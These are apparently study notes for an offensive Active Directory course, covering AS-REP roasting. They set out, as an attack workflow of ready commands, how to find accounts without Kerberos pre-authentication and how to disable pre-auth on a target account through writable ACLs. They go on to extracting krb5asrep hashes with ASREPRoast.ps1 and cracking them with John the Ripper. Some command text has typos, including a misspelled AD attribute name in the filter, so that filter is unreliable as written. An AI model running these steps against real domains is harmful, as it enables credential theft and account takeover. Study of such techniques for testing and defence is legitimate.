Target Kerberoasting AS-REP
• What is PreAuth Kerberos --> During initial login, when timestamp is encrypted with NTLM hash of the user account, it is known as Pre-Auth data. 
• If Pre-Auth is not enabled, we can grab the encrypted part from the AS-REP and decrypt is offline
• Once AS-REQ is sent and when DC sends AS-REP, a part of TGT is encrypted using user's key. 
• The encrypted part signed by the user's key is the area of target for this attack.

• Identity Users for AS-REP Kerberoasting
    • PowerView Commands (Dev)
        • Get-DomainUser -PreauthNotRequired -Verbose --> Identify user that have PreAuthNotRequired enabled
    • AD Module Commands
        • Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth --> Identify user that have PreAuthNotRewquired enabled
   
    • PowerView Commands (Dev)
        • To find users for which current user has as "ActiveDirectoryRights" write or GenericAll access i.e. check for UserAccountControl flags permission:
            • Invoke-ACLScanner -ResolvedGUIDS | ?{$_.IdentityReferenceName -match "GROUPNAME"} --> Invoke-ACLScanner checks for interesting ACLs and then user needs to check which user has "ActiveDirectoryRights" write or GenericAll access i.e. check for UserAccountControl flags permission. 
        • To Disabled PreAuth property for the user.
            • Set-DomainObject -Identity USERName -XOR @{useraccountcontrol=4194304} -Verbose
        • Extracting Hash for users
            • Using ASREPROAST.ps1 script extract the krb5asrep hash from the TGT ticket
            • Get-ASREPHash -UserName User → Extract Encrypted part using the ASP-REP. Get user from above commands
        • To enumerate All users with Kerberos preauth disabled and request a hash 
            • Import-Module ASREPRoast.ps1
            • Invoke-ASREPRoast -Verbose
         • Cracking the hash
            • /john file-with-hash.txt --wordlist=wordlist.txt 
